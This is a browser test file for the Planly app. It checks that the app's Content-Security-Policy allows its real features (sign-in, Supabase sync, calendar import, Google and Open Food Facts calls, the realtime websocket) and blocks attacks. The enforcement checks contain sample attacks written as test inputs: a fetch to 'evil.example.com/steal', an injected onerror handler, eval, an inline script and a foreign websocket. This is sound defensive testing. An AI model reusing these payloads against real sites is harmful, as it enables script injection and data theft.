// Content-Security-Policy (meta tag in v2/index.html). With the policy enforced, everything Planly does works with no
// violation: start-up (theme set before paint), every tab, email sign-in, Google sign-in, cloud sync (load and save),
// calendar import, the Google Calendar API, Google sign-in's revoke and logging, Open Food Facts, and the realtime
// websocket. And it is really enforced: an unknown origin, an injected inline event handler, eval and a websocket to
// another host are all blocked. (The household live updates themselves are covered by household-live.test.mjs, which
// runs under the same policy.)
// Run: node tests/browser/csp.test.mjs (see tests/browser/README.md).
import {startServer,launchBrowser,makeDb,newPhone,openApp,installMock,OWNER} from './harness.mjs';
const server=await startServer();const browser=await launchBrowser();
let pass=0,fail=0;const check=(n,c,d='')=>{console.log((c?'PASS ':'FAIL ')+n+(c?'':' — '+d));c?pass++:fail++};
const W=ms=>new Promise(r=>setTimeout(r,ms));
const SB='https://dtniwcwjucepsjzoojuc.supabase.co';
const watch=async context=>{await context.addInitScript(()=>{window.__csp=[];document.addEventListener('securitypolicyviolation',e=>window.__csp.push(e.effectiveDirective+' '+e.blockedURI))})};
const violations=page=>page.evaluate(()=>window.__csp||[]);
const ok=(body,type='application/json')=>({status:200,contentType:type,headers:{'access-control-allow-origin':'*'},body:typeof body==='string'?body:JSON.stringify(body)});

// 1 · signed in: start-up, every tab, sync, calendar import, allowed origins
{const db=makeDb();const {context,errors}=await newPhone(browser,db,OWNER);await watch(context);
 const asked=[];await context.route('**/functions/v1/calendar-source-create',r=>{asked.push(r.request().url());return r.fulfill(ok({source:{id:'c0000000-0000-4000-8000-000000000001',name:'NHS rota',source_type:'ical',colour:'#E78AA7',is_read_only:true,show_today:true,show_month:true,show_timeline:true,enabled:true,status:'connected',last_synced_at:null}}))});
 for(const host of ['www.googleapis.com','oauth2.googleapis.com','world.openfoodfacts.org','search.openfoodfacts.org'])await context.route(`https://${host}/**`,r=>r.fulfill(ok({ok:true})));
 await context.route('https://accounts.google.com/gsi/log**',r=>r.fulfill(ok('')));
 const page=await openApp(context,errors);
 check('the app starts with the policy enforced',await page.evaluate(()=>!!document.querySelector('.nav')&&window.__planlySwBoot?.status!=='error'),await page.evaluate(()=>JSON.stringify(window.__planlySwBoot)));
 check('…the policy is in force (meta tag present, inline script blocked by it)',await page.evaluate(()=>!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')));
 check('…the theme is set before the app loads (boot-head.js ran)',await page.evaluate(()=>!!document.documentElement.dataset.theme));
 for(const tab of ['today','plan','home','budget','fitness']){await page.evaluate(t=>document.querySelector(`.nav button[data-section="${t}"]`)?.click(),tab);await W(1200)}
 await page.evaluate(()=>document.querySelector('#profileToggle')?.click());await W(800);
 const reads=db.log.filter(l=>l.table||l.rpc).length;
 check('cloud sync loads data from Supabase',reads>5,String(reads));
 // save: add a task through the quick-add sheet
 await page.evaluate(()=>document.querySelector('.nav button[data-section="today"]')?.click());await W(800);
 const before=db.tables.planly_tasks.length;
 await page.evaluate(()=>document.getElementById('addBtn')?.click());await W(700);
 await page.evaluate(()=>{const t=document.querySelector('#taskTitle,#sheetTitleInput,input[name="title"]');if(t){t.value='CSP check';t.dispatchEvent(new Event('input',{bubbles:true}))}});
 await page.evaluate(()=>document.querySelector('#taskForm [type="submit"],#saveTask,.sheet .primary[type="submit"]')?.click());await W(2500);
 check('cloud sync saves a new task to Supabase',db.tables.planly_tasks.length>before,String(db.tables.planly_tasks.length-before));
 // calendar import through the Edge Function
 await page.evaluate(()=>document.querySelector('#profileToggle')?.click());await W(700);
 await page.evaluate(()=>document.querySelector('[data-settings-page="calendars"]')?.click());await W(1200);
 await page.evaluate(()=>{const d=document.querySelector('#planlyCalendarName')?.closest('details');if(d)d.open=true;const n=document.getElementById('planlyCalendarName'),u=document.getElementById('planlyCalendarUrl');if(n)n.value='NHS rota';if(u)u.value='https://example.org/rota.ics'});
 await page.evaluate(()=>document.getElementById('planlyAddCalendarBtn')?.click());await W(2000);
 check('calendar import reaches the calendar-source-create function',asked.length===1,String(asked.length));
 const allowed=await page.evaluate(async()=>{const out={};for(const u of ['https://www.googleapis.com/calendar/v3/users/me/calendarList','https://oauth2.googleapis.com/revoke?token=x','https://accounts.google.com/gsi/log?x=1','https://world.openfoodfacts.org/api/v2/product/1.json','https://search.openfoodfacts.org/search?q=beans']){try{out[u]=(await fetch(u)).ok}catch(e){out[u]='blocked'}}return out});
 check('Google Calendar API, Google revoke/logging and Open Food Facts are reachable',Object.values(allowed).every(v=>v===true),JSON.stringify(allowed));
 const v=await violations(page);
 check('…and none of that caused a single CSP violation',v.length===0,v.join(' | '));
 // enforcement
 const blocked=await page.evaluate(async()=>{const r={};try{await fetch('https://evil.example.com/steal');r.fetch='allowed'}catch{r.fetch='blocked'}
  const host=document.createElement('div');host.innerHTML='<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onerror="window.__pwned=1" onload="window.__pwned=1">';document.body.appendChild(host);await new Promise(x=>setTimeout(x,300));r.handler=window.__pwned?'ran':'blocked';
  try{new Function('return 1')();r.eval='allowed'}catch{r.eval='blocked'}
  const s=document.createElement('script');s.textContent='window.__inline=1';document.body.appendChild(s);r.inline=window.__inline?'ran':'blocked';return r});
 check('an unknown origin, an injected inline handler, eval and an injected inline script are all blocked',Object.values(blocked).every(x=>x==='blocked'),JSON.stringify(blocked));
 const v2=await violations(page);
 check('…each reported as a CSP violation',v2.some(x=>x.startsWith('connect-src https://evil.example.com'))&&v2.some(x=>/^script-src(-elem|-attr)? /.test(x)),v2.join(' | '));
 check('no page errors',errors.filter(e=>!/EvalError|Content Security Policy|unsafe-eval/i.test(e)).length===0,errors.slice(0,3).join(' | '));
 await context.close()}

// 2 · signed out: email sign-in and Google sign-in go to Supabase without a violation
{const db=makeDb();const context=await browser.newContext({viewport:{width:390,height:844},isMobile:true,hasTouch:true,serviceWorkers:'allow'});await installMock(context,db,OWNER);await watch(context);
 const authCalls=[];context.on('request',r=>{if(r.url().startsWith(SB+'/auth/v1/'))authCalls.push(r.method()+' '+new URL(r.url()).pathname+(r.isNavigationRequest()?' (page)':''))});
 const errors=[];const page=await openApp(context,errors);
 await page.evaluate(()=>document.getElementById('planlyWelcomeEmail')?.click());await W(500);
 await page.evaluate(()=>{const e=document.getElementById('planlyWelcomeEmailInput'),p=document.getElementById('planlyWelcomePassword');e.value='musti@example.com';p.value='a-long-password-123';e.dispatchEvent(new Event('input',{bubbles:true}));p.dispatchEvent(new Event('input',{bubbles:true}))});
 await page.evaluate(()=>document.getElementById('planlyWelcomeSubmit')?.click());await W(1500);
 check('email sign-in posts to Supabase Auth',authCalls.some(x=>x.startsWith('POST /auth/v1/token')),authCalls.join(', '));
 const v=await violations(page);
 check('…with no CSP violation',v.length===0,v.join(' | '));
 await page.evaluate(()=>document.getElementById('planlyWelcomeBack')?.click());await W(300);
 await page.evaluate(()=>document.getElementById('planlyWelcomeGoogle')?.click());await W(2500);
 check('Google sign-in opens Supabase’s Google authorize page',authCalls.some(x=>x.includes('/auth/v1/authorize')&&x.endsWith('(page)')),authCalls.join(', '));
 await context.close()}

// 3 · realtime: the Supabase websocket connects; a websocket to another host is blocked
{const db=makeDb();const {context,errors}=await newPhone(browser,db,OWNER);await watch(context);
 let opened=0;await context.routeWebSocket(/dtniwcwjucepsjzoojuc\.supabase\.co\/realtime\/v1\/websocket/,ws=>{opened++;ws.onMessage(()=>{})});
 const page=await openApp(context,errors);
 const r=await page.evaluate(async()=>{const tryWs=u=>new Promise(res=>{let ws;try{ws=new WebSocket(u)}catch{return res('blocked')}ws.onopen=()=>{ws.close();res('open')};ws.onerror=()=>res('error');setTimeout(()=>res('timeout'),3000)});
  return {supabase:await tryWs('wss://dtniwcwjucepsjzoojuc.supabase.co/realtime/v1/websocket?vsn=1.0.0'),other:await tryWs('wss://evil.example.com/socket')}});
 check('the Supabase realtime websocket connects under the policy',r.supabase==='open'&&opened>=1,JSON.stringify({r,opened}));
 const v=await violations(page);
 check('…a websocket to any other host is blocked by connect-src',r.other!=='open'&&v.some(x=>x.startsWith('connect-src wss://evil.example.com')),JSON.stringify({r,v}));
 await context.close()}

console.log(`${pass} passed, ${fail} failed`);await browser.close();server.close();process.exit(fail?1:0);
